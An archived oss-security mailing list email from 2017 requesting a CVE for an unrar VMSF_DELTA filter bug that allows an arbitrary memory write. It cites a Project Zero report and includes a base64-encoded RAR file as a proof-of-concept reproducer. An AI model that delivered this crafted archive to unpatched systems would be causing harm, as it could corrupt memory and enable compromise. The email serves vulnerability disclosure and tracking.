X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1640" "Wednesday" "21" "June" "2017" "14:20:01" "+0200" "Alexander Bergmann" "abergmann@suse.com" "<20170621122001.GA3350@intrepid>" "51" "[oss-security] CVE Request: unrar: VMSF_DELTA filter allows arbitrary memory write" "^Cc:" nil nil "6" "2017062112:20:01" "[oss-security] CVE Request: unrar: VMSF_DELTA filter allows arbitrary memory write" (number mark "        abergmann@su Jun 21   51/1640  " thread-indent "\"[oss-security] CVE Request: unrar: VMSF_DELTA filter allows arbitrary memory write\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 3819 invoked by uid 550); 21 Jun 2017 13:05:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 28134 invoked from network); 21 Jun 2017 12:20:15 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20170621122001.GA3350@intrepid>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="k1lZvvs/B4yU6o8G"
Content-Disposition: inline
User-Agent: Mutt/1.5.24 (2015-08-30)
Cc: cve-assign@mitre.org
Date: Wed, 21 Jun 2017 14:20:01 +0200
From: Alexander Bergmann <abergmann@suse.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: unrar: VMSF_DELTA filter allows arbitrary memory write
To: oss-security@lists.openwall.com

--k1lZvvs/B4yU6o8G
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hi,

It was reported that unrar fixed a VMSF_DELTA memory corruption issue in
there latest version unrarsrc-5.5.5.tar.gz. This problem was reported to
Sophos AV in 2012 but never reach upstream rar.

https://bugs.chromium.org/p/project-zero/issues/detail?id=3D1286&desc=3D6#m=
aincol

Reproducer:

Base64-encoded RAR file to trigger the VMSF_DELTA issue:

UmFyIRoHAPlOcwAADgAAAAAAAAAAMAh0AAAmAI4AAAAAAAAAAhBBUiEAAAAAHQAGAAAAACBzdGRv
dXQgIVUMzRDNmBGByDAda+AXaSv4KvQr1K/oejL05mXmXmww5tEk8gA9k8nmieyeyeswuOR6cx69
a2Hd6zQwu3aoMDDwMEswADAAMD4P938w+dydoRFwAmwAAAAAvv////+/////+9W3QFgAAQAGAAAA
Ooimhd12AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

As far as I can tell no CVE was assigned to this issue so far.


Regrads,
Alex~

--=20
Alexander Bergmann <abergmann@suse.com>, Security Engineer, GPG:9FFA4886
SUSE Linux GmbH, GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG N=FCrnberg)

--k1lZvvs/B4yU6o8G
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQEcBAEBAgAGBQJZSmRxAAoJEN5U6HWf+kiGfboH/31lSwrztDKGDoVoUsGlExld
UIf7dONX/OKoVL0BXxh0JBRjpcV9rCYfypoHaM25+FHdE5jGYorp4P6D+KXN4gDF
jHwuGYQEDBo4ejZeOp92gwfmek5k4FYxUUlNpSqPUC20Qmg/qp1OQZUQrjJTtT1L
NeNrRWvHtizxtSyVbpe0yDSy44QRZ3rhLJqil5cZ0cVAUWwhVPj0oJYvRpzKzMWL
yGkiRf/mCU6MjoI3L5WRMCjHBC91dTu8eJhxTklbMYp5pF4fvsP9+wExWPlxS1t0
IF4OCgD0Yx3biBcRfWVXJKrklwrq0YYVRPCk9oTKOByV/At/ZSwRKyPBr8McrWk=
=g9ez
-----END PGP SIGNATURE-----

--k1lZvvs/B4yU6o8G--
